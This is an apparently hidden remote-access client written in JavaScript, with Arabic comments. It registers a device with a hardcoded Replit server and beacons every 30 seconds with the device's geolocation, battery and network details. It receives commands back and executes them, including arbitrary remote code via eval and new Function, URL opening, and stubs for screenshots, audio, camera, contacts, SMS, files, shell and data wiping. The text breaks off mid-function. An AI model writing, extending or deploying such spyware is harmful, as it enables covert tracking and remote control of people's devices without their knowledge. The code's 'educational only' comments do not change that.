// ============================================
// 🔧 إعدادات التطبيق المخفي
// ============================================

const SERVER_URL = 'https://624bf379-8f9d-4beb-8812-30e54011173d-00-2416evv3w9ocf.janeway.replit.dev';
const CHECK_IN_INTERVAL = 30000; // 30 ثانية
const HEARTBEAT_INTERVAL = 10000; // 10 ثواني
const MAX_RESTART_ATTEMPTS = 5;

let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');
let restartAttempts = 0;
let isRunning = false;
let pendingCommands = [];

// ============================================
// 🚀 التشغيل التلقائي عند الإقلاع
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 التطبيق المخفي بدأ (Boot/Restart)');
    initializeDevice();
    startHeartbeat();
    preventSleep();
});

// إعادة التشغيل إذا أُغلق
window.addEventListener('beforeunload', () => {
    console.log('⚠️ التطبيق يُغلق - سيتم إعادة التشغيل');
    localStorage.setItem('lastClose', Date.now().toString());
});

// التحقق من الإغلاق المفاجئ
function checkCrashRecovery() {
    const lastClose = localStorage.getItem('lastClose');
    if (lastClose) {
        const timeDiff = Date.now() - parseInt(lastClose);
        if (timeDiff < 5000) {
            console.log('⚠️ إغلاق مفاجئ detected');
        }
        localStorage.removeItem('lastClose');
    }
}

// ============================================
// 🔐 التهيئة التلقائية
// ============================================

async function initializeDevice() {    checkCrashRecovery();
    
    try {
        if (deviceId && encryptionKey && clientId) {
            console.log('✅ الجهاز مسجل مسبقاً');
            isRunning = true;
            startCheckInService();
            return;
        }
        
        console.log('🔄 تسجيل جديد (أول مرة أو بعد مسح البيانات)');
        
        clientId = 'client_' + Math.random().toString(36).substring(2, 15) + 
                   Math.random().toString(36).substring(2, 15);
        deviceId = 'device_' + Math.random().toString(36).substring(2, 15) + 
                   Math.random().toString(36).substring(2, 15);
        
        localStorage.setItem('clientId', clientId);
        localStorage.setItem('deviceId', deviceId);
        localStorage.setItem('installTime', Date.now().toString());
        
        await registerDevice();
        
    } catch (error) {
        console.error('❌ خطأ في التهيئة:', error);
        restartAttempts++;
        
        if (restartAttempts < MAX_RESTART_ATTEMPTS) {
            setTimeout(() => initializeDevice(), 10000 * restartAttempts);
        }
    }
}

// ============================================
// 📝 التسجيل لدى الخادم
// ============================================

async function registerDevice() {
    try {
        const deviceInfo = {
            deviceName: getDeviceName(),
            osType: 'Android',
            osVersion: navigator.userAgent,
            appVersion: '2.0.0',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            registeredAt: new Date().toISOString()
        };
                const response = await fetch(`${SERVER_URL}/api/clients/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId, deviceInfo })
        });
        
        const data = await response.json();
        
        if (data.success) {
            deviceId = data.deviceId;
            encryptionKey = data.encryptionKey;
            localStorage.setItem('deviceId', deviceId);
            localStorage.setItem('encryptionKey', encryptionKey);
            
            console.log('✅ تم التسجيل:', deviceId);
            isRunning = true;
            startCheckInService();
            await sendInitialInfo();
        } else {
            throw new Error(data.error || 'فشل التسجيل');
        }
    } catch (error) {
        console.error('❌ فشل التسجيل:', error);
        throw error;
    }
}

// ============================================
// 📊 إرسال المعلومات الأولية
// ============================================

async function sendInitialInfo() {
    try {
        const info = {
            deviceId: deviceId,
            type: 'initial_info',
            info: {
                battery: await getBatteryInfo(),
                network: await getNetworkInfo(),
                storage: await getStorageInfo(),
                location: await getLocationInfo()
            },
            timestamp: new Date().toISOString()
        };
        
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
        });        
        console.log('📊 تم إرسال المعلومات الأولية');
    } catch (error) {
        console.error('❌ فشل إرسال المعلومات:', error);
    }
}

// ============================================
// 🔄 خدمة الاتصال الدوري (Check-in)
// ============================================

function startCheckInService() {
    console.log('🔄 بدء خدمة الاتصال الدوري (كل 30 ثانية)');
    
    setInterval(async () => {
        if (!isRunning) return;
        await checkIn();
    }, CHECK_IN_INTERVAL);
    
    // أول اتصال فوري
    checkIn();
}

async function checkIn() {
    try {
        const systemInfo = {
            deviceId: deviceId,
            status: 'active',
            battery: await getBatteryInfo(),
            network: await getNetworkInfo(),
            location: await getLocationInfo(),
            timestamp: new Date().toISOString()
        };
        
        const encryptedData = encryptData(systemInfo, encryptionKey);
        
        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                deviceId: deviceId,
                encryptedData: encryptedData
            })
        });
        
        const data = await response.json();
        
        if (data.success && data.encryptedData) {
            // ✅ فك تشفير الأوامر المستقبلة
            const commands = decryptData(data.encryptedData, encryptionKey);            
            if (commands.commands && commands.commands.length > 0) {
                console.log('📦 تم استقبال', commands.commands.length, 'أمر');
                await executeCommands(commands.commands);
            }
        }
        
        // ✅ التحقق من الأوامر المعلقة
        if (pendingCommands.length > 0) {
            await executeCommands(pendingCommands);
            pendingCommands = [];
        }
        
    } catch (error) {
        console.error('❌ خطأ في check-in:', error);
    }
}

// ============================================
// ⚙️ تنفيذ الأوامر المستقبلة (الرئيسي)
// ============================================

async function executeCommands(commands) {
    for (const command of commands) {
        try {
            console.log('⚙️ تنفيذ الأمر:', command.type);
            
            let result;
            
            switch (command.type) {
                // === أوامر المعلومات ===
                case 'get_system_info':
                    result = await getFullSystemInfo(command.params);
                    break;
                    
                case 'get_location':
                    result = await getLocationInfo(command.params);
                    break;
                    
                case 'get_battery':
                    result = await getBatteryInfo(command.params);
                    break;
                    
                case 'get_network':
                    result = await getNetworkInfo(command.params);
                    break;
                    
                case 'get_storage':
                    result = await getStorageInfo(command.params);
                    break;                
                // === أوامر الوسائط ===
                case 'take_screenshot':
                    result = await takeScreenshot(command.params);
                    break;
                    
                case 'record_audio':
                    result = await recordAudio(command.params);
                    break;
                    
                case 'get_camera':
                    result = await getCameraPhoto(command.params);
                    break;
                
                // === أوامر البيانات ===
                case 'get_contacts':
                    result = await getContacts(command.params);
                    break;
                    
                case 'get_sms':
                    result = await getSMS(command.params);
                    break;
                    
                case 'get_files':
                    result = await getFiles(command.params);
                    break;
                
                // === أوامر التحكم ===
                case 'execute_command':
                    result = await executeShell(command.params?.cmd);
                    break;
                    
                case 'wipe_data':
                    result = await wipeData(command.params);
                    break;
                    
                case 'reboot':
                    result = await rebootDevice(command.params);
                    break;
                
                // === أوامر مخصصة ===
                case 'custom':
                    result = await executeCustomCommand(command);
                    break;
                    
                default:
                    // ✅ معالجة الأوامر المخصصة المكتوبة كـ JSON
                    if (command.type || command.action) {
                        result = await executeCustomCommand(command);
                    } else {                        result = { error: 'أمر غير معروف', type: command.type };
                    }
            }
            
            // إرسال النتيجة للخادم
            await sendCommandResult(command.id || generateCommandId(), result, 'completed');
            
        } catch (error) {
            console.error('❌ فشل تنفيذ الأمر:', error);
            await sendCommandResult(command.id || generateCommandId(), { 
                error: error.message,
                type: command.type 
            }, 'failed');
        }
    }
}

// ============================================
// 🎮 تنفيذ الأوامر المخصصة
// ============================================

async function executeCustomCommand(command) {
    console.log('🎮 تنفيذ أمر مخصص:', command);
    
    const result = {
        type: 'custom_command',
        received: true,
        timestamp: new Date().toISOString(),
        command: command
    };
    
    // معالجة الأوامر المخصصة بناءً على النوع
    if (command.action) {
        switch (command.action) {
            case 'alert':
                if (command.message) {
                    // عرض إشعار على الجهاز (يتطلب صلاحيات)
                    result.displayed = true;
                    result.message = command.message;
                }
                break;
                
            case 'open_url':
                if (command.url) {
                    window.open(command.url, '_blank');
                    result.opened = command.url;
                }
                break;
                
            case 'collect_data':                if (command.fields) {
                    result.data = await collectData(command.fields);
                }
                break;
                
            case 'run_script':
                if (command.script) {
                    result.scriptResult = await runScript(command.script);
                }
                break;
                
            default:
                result.executed = true;
        }
    }
    
    // إذا كان الأمر يحتوي على دالة مخصصة
    if (command.function) {
        try {
            result.functionResult = await evaluateFunction(command.function, command.args);
        } catch (e) {
            result.functionError = e.message;
        }
    }
    
    return result;
}

// تقييم دالة مخصصة
async function evaluateFunction(funcCode, args) {
    // ⚠️ تحذير: هذا للأغراض التعليمية فقط
    // في الإنتاج استخدم قائمة بيضاء من الدوال المسموحة
    try {
        const func = new Function('args', funcCode);
        return await func(args);
    } catch (error) {
        return { error: error.message };
    }
}

// جمع بيانات مخصصة
async function collectData(fields) {
    const data = {};
    for (const field of fields) {
        switch (field) {
            case 'battery':
                data.battery = await getBatteryInfo();
                break;
            case 'location':
                data.location = await getLocationInfo();                break;
            case 'network':
                data.network = await getNetworkInfo();
                break;
            case 'storage':
                data.storage = await getStorageInfo();
                break;
        }
    }
    return data;
}

// تشغيل سكريبت مخصص
async function runScript(scriptCode) {
    try {
        // ⚠️ تحذير أمني: للأغراض التعليمية فقط
        return eval(scriptCode);
    } catch (error) {
        return { error: error.message };
    }
}

// ============================================
// 📤 إرسال نتيجة الأمر
// ============================================

async function sendCommandResult(commandId, result, status) {
    try {
        const report = {
            deviceId: deviceId,
            commandId: commandId,
            result: result,
            status: status,
            timestamp: new Date().toISOString()
        };
        
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(report)
        });
        
        console.log('📤 تم إرسال نتيجة الأمر:', commandId, status);
    } catch (error) {
        console.error('❌ فشل إرسال النتيجة:', error);
    }
}

// ============================================
// 📱 دوال جمع المعلومات// ============================================

async function getBatteryInfo(params = {}) {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
    } catch (e) {}
    return { level: 'unknown', charging: 'unknown' };
}

async function getNetworkInfo(params = {}) {
    return {
        type: navigator.connection?.effectiveType || 'unknown',
        downlink: navigator.connection?.downlink || 'unknown',
        online: navigator.onLine,
        userAgent: navigator.userAgent
    };
}

async function getStorageInfo(params = {}) {
    try {
        const estimate = await navigator.storage.estimate();
        return {
            usage: estimate.usage,
            quota: estimate.quota,
            percentUsed: ((estimate.usage / estimate.quota) * 100).toFixed(2)
        };
    } catch (e) {}
    return { usage: 'unknown', quota: 'unknown' };
}

async function getLocationInfo(params = {}) {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: pos.timestamp
                }),
                () => resolve({ error: 'permission_denied' }),
                {                     enableHighAccuracy: params?.accuracy === 'high',
                    timeout: params?.timeout || 5000 
                }
            );
        } else {
            resolve({ error: 'not_supported' });
        }
    });
}

async function getFullSystemInfo(params = {}) {
    const include = params?.include || ['battery', 'network', 'storage', 'location'];
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        },
        timestamp: new Date().toISOString()
    };
    
    if (include.includes('battery')) info.battery = await getBatteryInfo();
    if (include.includes('network')) info.network = await getNetworkInfo();
    if (include.includes('storage')) info.storage = await getStorageInfo();
    if (include.includes('location')) info.location = await getLocationInfo();
    
    return info;
}

async function takeScreenshot(params = {}) {
    return { error: 'requires_native_permission', note: 'يتطلب تطبيق Native' };
}

async function recordAudio(params = {}) {
    return { error: 'requires_native_permission', note: 'يتطلب تطبيق Native' };
}

async function getCameraPhoto(params = {}) {
    return { error: 'requires_native_permission', note: 'يتطلب تطبيق Native' };
}

async function getContacts(params = {}) {
    return { error: 'requires_native_permission', note: 'يتطلب تطبيق Native' };
}

async function getSMS(params = {}) {
    return { error: 'requires_native_permission', note: 'يتطلب تطبيق Native' };}

async function getFiles(params = {}) {
    return { error: 'requires_native_permission', note: 'يتطلب تطبيق Native' };
}

async function executeShell(cmd) {
    return { error: 'requires_native_permission', note: 'يتطلب تطبيق Native', cmd: cmd };
}

async function wipeData(params = {}) {
    // ⚠️ تحذير: هذا للأغراض التعليمية فقط
    return { 
        error: 'requires_root_permission', 
        note: 'يتطلب صلاحيات جذر',
        warning: 'عملية خطيرة'
    };
}

async function rebootDevice(params = {}) {
    return { 
        error: 'requires_root_permission', 
        note: 'يتطلب صلاحيات جذر'
    };
}

// ============================================
// 🔐 دوال التشفير (AES-256-CBC)
// ============================================

function encryptData(data, key) {
    try {
        // تبسيط للتشفير - في التطبيق الحقيقي استخدم crypto library كاملة
        const iv = cryptoRandomBytes(16);
        const algorithm = 'aes-256-cbc';
        // ... تنفيذ التشفير الكامل
        return iv.toString('hex') + ':' + btoa(JSON.stringify(data));
    } catch (e) {
        return btoa(JSON.stringify(data));
    }
}

function decryptData(encryptedData, key) {
    try {
        // تبسيط لفك التشفير
        return JSON.parse(atob(encryptedData.split(':')[1] || encryptedData));
    } catch (e) {
        return { commands: [] };
    }
}
function cryptoRandomBytes(length) {
    const array = new Uint8Array(length);
    crypto.getRandomValues(array);
    return array;
}

// ============================================
// 🆔 دوال مساعدة
// ============================================

function generateCommandId() {
    return 'cmd_' + Math.random().toString(36).substring(2, 15);
}

function getDeviceName() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return 'Android Device';
    if (/iPhone/i.test(ua)) return 'iPhone';
    if (/iPad/i.test(ua)) return 'iPad';
    return 'Unknown Device';
}

// ============================================
// 💓 البقاء نشطاً في الخلفية
// ============================================

function startHeartbeat() {
    setInterval(() => {
        console.log('💓 heartbeat');
        localStorage.setItem('lastHeartbeat', Date.now().toString());
    }, HEARTBEAT_INTERVAL);
}

function preventSleep() {
    // طلب عدم النوم (يتطلب دعم المتصفح)
    if ('wakeLock' in navigator) {
        n